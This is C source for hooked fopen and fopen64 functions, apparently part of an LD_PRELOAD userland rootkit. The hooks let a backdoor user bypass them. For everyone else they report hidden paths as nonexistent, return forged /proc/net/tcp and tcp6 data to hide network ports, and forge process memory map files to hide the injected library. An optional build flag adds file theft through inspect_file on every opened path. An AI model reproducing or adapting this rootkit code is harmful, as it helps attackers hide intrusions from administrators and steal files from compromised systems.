FILE *fopen(const char *pathname, const char *mode){
    hook(CFOPEN);
    if(is_bdusr()) return call(CFOPEN, pathname, mode);
    if(hidden_path(pathname)){
        errno = ENOENT;
        return NULL;
    }

#ifdef HIDE_PORTS
    if(!xstrncmp(TCP_PATH, pathname) || !xstrncmp(TCP6_PATH, pathname))
        return forge_procnet(pathname);
#endif

#ifdef FORGE_MAPS
    if(!xfnmatch(MAPS_FULL_PATH, pathname)) return forge_maps(pathname);
    if(!xfnmatch(SMAPS_FULL_PATH, pathname)) return forge_smaps(pathname);
    if(!xfnmatch(NMAPS_FULL_PATH, pathname)) return forge_numamaps(pathname);

    char cwd[PATH_MAX];
    if(getcwd(cwd, sizeof(cwd)) != NULL){
        if(!xstrncmp(PROC_PATH, cwd)){
            if(!xfnmatch(MAPS_PROC_PATH, pathname)) return forge_maps(pathname);
            if(!xfnmatch(SMAPS_PROC_PATH, pathname)) return forge_smaps(pathname);
            if(!xfnmatch(NMAPS_PROC_PATH, pathname)) return forge_numamaps(pathname);
        }

        if(!xfnmatch(PROC_ALL_PATH, cwd)){
            if(!xfnmatch(MAPS_FILENAME, pathname)) return forge_maps(pathname);
            if(!xfnmatch(SMAPS_FILENAME, pathname)) return forge_smaps(pathname);
            if(!xfnmatch(NMAPS_FILENAME, pathname)) return forge_numamaps(pathname);
        }
    }
#endif

#ifdef FILE_STEAL
    inspect_file(pathname);
#endif
    return call(CFOPEN, pathname, mode);
}

FILE *fopen64(const char *pathname, const char *mode){
    hook(CFOPEN64);
    if(is_bdusr()) return call(CFOPEN64, pathname, mode);
    if(hidden_path(pathname)){
        errno = ENOENT;
        return NULL;
    }

#ifdef HIDE_PORTS
    if(!xstrncmp(TCP_PATH, pathname) || !xstrncmp(TCP6_PATH, pathname))
      return forge_procnet(pathname);
#endif

#ifdef FORGE_MAPS
    if(!xfnmatch(MAPS_FULL_PATH, pathname)) return forge_maps(pathname);
    if(!xfnmatch(SMAPS_FULL_PATH, pathname)) return forge_smaps(pathname);
    if(!xfnmatch(NMAPS_FULL_PATH, pathname)) return forge_numamaps(pathname);

    char cwd[PATH_MAX];
    if(getcwd(cwd, sizeof(cwd)) != NULL){
        if(!xstrncmp(PROC_PATH, cwd)){
            if(!xfnmatch(MAPS_PROC_PATH, pathname)) return forge_maps(pathname);
            if(!xfnmatch(SMAPS_PROC_PATH, pathname)) return forge_smaps(pathname);
            if(!xfnmatch(NMAPS_PROC_PATH, pathname)) return forge_numamaps(pathname);
        }

        if(!xfnmatch(PROC_ALL_PATH, cwd)){
            if(!xfnmatch(MAPS_FILENAME, pathname)) return forge_maps(pathname);
            if(!xfnmatch(SMAPS_FILENAME, pathname)) return forge_smaps(pathname);
            if(!xfnmatch(NMAPS_FILENAME, pathname)) return forge_numamaps(pathname);
        }
    }
#endif

#ifdef FILE_STEAL
    inspect_file(pathname);
#endif
    return call(CFOPEN64, pathname, mode);
}
